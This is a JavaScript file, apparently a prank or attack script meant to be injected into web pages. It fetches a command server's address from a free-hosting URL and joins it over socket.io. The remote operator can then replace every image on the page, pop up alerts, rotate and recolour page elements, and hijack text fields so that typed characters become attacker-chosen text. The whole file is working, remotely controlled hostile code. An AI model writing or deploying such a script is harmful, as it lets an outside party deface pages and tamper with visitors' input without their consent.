var serverHost, stringifyJs, socket;


fetch('https://remotehostsmiley.000webhostapp.com/getServer.json')
.then(response => response.json())
.then(json => {
    stringifyJs = JSON.stringify(json)
    stringifyJs = stringifyJs.split(':"')
    stringifyJs = stringifyJs[1];
    stringifyJs = stringifyJs.slice(0, stringifyJs.length - 2)
    serverHost = stringifyJs;

    try {
        socket = io(serverHost);
    } catch(e) {
        console.log(socket)
    }
    if(socket === undefined){
        console.log("yes no socket yet")
        while(socket === undefined)
            socket = io(serverHost);
    }
    console.log("newtarget.js: " + serverHost)
    // const socket = io("http://localhost:3000")

    var image = document.querySelectorAll('img');
    var origImage = [];
    var bod;
    var allDivs;
    var shaker = false;
    var textHack = false;
    var p,span,a;


    for (i = 0; i < image.length; i++) {
        origImage[i] = image[i].src;
    }
    try {
        socket.on('greet', data=> {
            console.log(data);
        })
    } catch(e){
        console.log("greet" + e)

    }
    
    try {
        socket.on('smile', () => {
            console.log("evil smile")
            image = document.querySelectorAll('img');
            for (i = 0; i < image.length; i++) {
                image[i].src = "https://i.pinimg.com/originals/25/13/b5/2513b578aaf1b57df5dd0256274c5ff7.jpg"
            };
        })
    } catch(e){
        console.log("smile" + e)

    }

    try {
        socket.on("normal", ()=>{
            console.log("normal")
            for (i = 0; i < image.length; i++) {
                image[i].src = origImage[i];
            };
            shaker = false;
            textHack = false;

        })
    } catch(e){
    }

    try {
        socket.on("alert", (text)=>{
            alert(text)
        })
    } catch(e){
    }


    try {
        socket.on("shake", (degreeval)=>{
            shaker = true;
            setInterval(() => {
            if(shaker){
                bod = document.querySelector('body');
                bod.style.backgroundColor = "black";;
                allDivs = document.querySelectorAll('div');
                a = document.querySelectorAll('a');
                span = document.querySelectorAll('span');
                p = document.querySelectorAll('p');

                for (var i = 0; i < a.length; i++)
                    a[i].style['color'] = 'red';
                for (var i = 0; i < span.length; i++) 
                    span[i].style['color'] = 'red';
                for (var i = 0; i < p.length; i++) 
                    p[i].style['color'] = 'red';
                
                for (var i = 0; i < allDivs.length; i++) {
                    allDivs[i].style['background-color'] = 'black';
                    allDivs[i].style['color'] = 'green';
                    allDivs[i].style['font-family'] = 'Monospace';
                };
                Array.prototype.slice.call(document.querySelectorAll('div,p,span,img,a,body')).map(function(tag) {
                    tag.style['transform'] = 'rotate(' + (Math.floor(Math.random() * degreeval) - 1) + 'deg)';
                });
            } },10);
            
        })
    } catch(e){
        console.log("shake" + e)

    }

    try {
        socket.on("text", data=>{
            var TEXT = data;
            textHack = true;
            
            Array.prototype.slice.call(document.querySelectorAll(`input[type=text],textarea`)).map(function(el) {
                el.onkeypress = function(evt) {
                    var charCode = typeof evt.which == `number` ? evt.which : evt.keyCode;
                    if (charCode && charCode > 31) {
                        var start = this.selectionStart,
                            end = this.selectionEnd;
                        if(textHack){
                            this.value = this.value.slice(0, start) + TEXT[start % TEXT.length] + this.value.slice(end);
                            this.selectionStart = this.selectionEnd = start + 1;
                        } else {
                            this.value = this.value.slice(0, start) + String.fromCharCode(charCode) + this.value.slice(end);
                            this.selectionStart = this.selectionEnd = start + 1;
                        }
                    }
                    return false;
                }
            });
        })
    } catch(e){
        console.log("text" + e)
    }


})

